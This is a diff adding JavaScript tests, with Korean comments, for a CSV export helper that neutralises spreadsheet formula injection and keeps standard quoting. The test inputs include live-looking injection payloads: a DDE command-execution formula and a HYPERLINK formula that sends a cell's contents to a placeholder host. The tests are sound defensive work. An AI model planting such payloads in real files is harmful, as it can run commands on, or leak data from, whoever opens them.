@@ -1478,3 +1478,65 @@ test('평균 응답 시간은 기록된 서버 처리 시간에서만 계산되�
 
   resetLogs();
 });
+
+/* ────────────────────────────────────────────────────────────────
+ * DS 15-2 — CSV 수식 주입(formula injection)
+ * 내보낸 CSV 를 여는 곳은 엑셀이고, 그 표의 `message` 칸에는 **아무나 열 수 있는
+ * 상담창에 방문자가 직접 친 글자**가 들어간다. 따옴표 처리(RFC 4180)는 수식을 막지 못한다.
+ * 실제로 실행해 확인한다 — 텍스트 검사만으로는 "정말 앞에 따옴표가 서는가"를 모른다.
+ * ──────────────────────────────────────────────────────────────── */
+test('csvCell: 수식으로 읽히는 첫 글자를 중화한다', opts, async () => {
+  const { csvCell } = await importLib('csv');
+  // 엑셀·LibreOffice·Google 시트가 수식의 시작으로 읽는 글자들
+  for (const s of [
+    '=HYPERLINK("https://x/?d="&A2,"확인")',
+    '=cmd|\'/c calc\'!A0',
+    '+1+1',
+    '@SUM(A1:A9)',
+    '\tSUM(1)',
+    '\r=1',
+    '-HYPERLINK("https://x")',
+  ]) {
+    const cell = csvCell(s);
+    // 따옴표로 감쌌든 아니든, 값의 첫 글자는 반드시 작은따옴표여야 한다.
+    const inner = cell.startsWith('"') ? cell.slice(1, -1).replace(/""/g, '"') : cell;
+    assert.equal(inner[0], "'", `중화되지 않음: ${JSON.stringify(s)} → ${JSON.stringify(cell)}`);
+    assert.equal(inner.slice(1), s, '원문이 보존되어야 한다(운영자가 무엇을 받았는지 읽을 수 있게)');
+  }
+});
+
+test('csvCell: 순수한 수는 건드리지 않는다 — 음수 금액이 합계에서 빠지면 안 된다', opts, async () => {
+  const { csvCell } = await importLib('csv');
+  for (const v of ['-1200', -1200, '0', 0, '3.5', '-0.25', '120000']) {
+    assert.equal(csvCell(v), String(v), `수를 중화하면 안 된다: ${v}`);
+  }
+});
+
+test('csvCell: 구분자·따옴표·줄바꿈은 종전대로 감싼다(RFC 4180)', opts, async () => {
+  const { csvCell } = await importLib('csv');
+  assert.equal(csvCell('가,나'), '"가,나"');
+  assert.equal(csvCell('그는 "예"라 했다'), '"그는 ""예""라 했다"');
+  assert.equal(csvCell('한 줄\n두 줄'), '"한 줄\n두 줄"');
+  assert.equal(csvCell('보통 글자'), '보통 글자');
+  // null·undefined 는 빈 칸 — 0 으로 채우면 받는 쪽이 "0원"으로 읽는다(settlement 규약).
+  assert.equal(csvCell(null), '');
+  assert.equal(csvCell(undefined), '');
+  assert.equal(csvCell(false), 'false');
+});
+
+test('csvRow: 수식 중화가 행 단위로도 걸린다', opts, async () => {
+  const { csvRow } = await importLib('csv');
+  const row = csvRow(['t1', '=1+1', -500, null]);
+  assert.equal(row, `t1,'=1+1,-500,`);
+});
+
+test('감사 로그 CSV 가 수식 주입을 실제로 막는다', opts, async () => {
+  const audit = await importLib('audit');
+  audit.resetAudit();
+  audit.logAudit({ action: 'kb.upsert', target: '=cmd|\'/c calc\'!A0', detail: '@SUM(A1)', authed: true });
+  const csv = audit.auditToCsv();
+  assert.ok(!/(^|,)=cmd/m.test(csv), `수식이 그대로 실렸다:\n${csv}`);
+  assert.ok(!/(^|,)@SUM/m.test(csv), `수식이 그대로 실렸다:\n${csv}`);
+  assert.match(csv, /'=cmd/, '원문은 보존되어야 한다');
+  audit.resetAudit();
+});
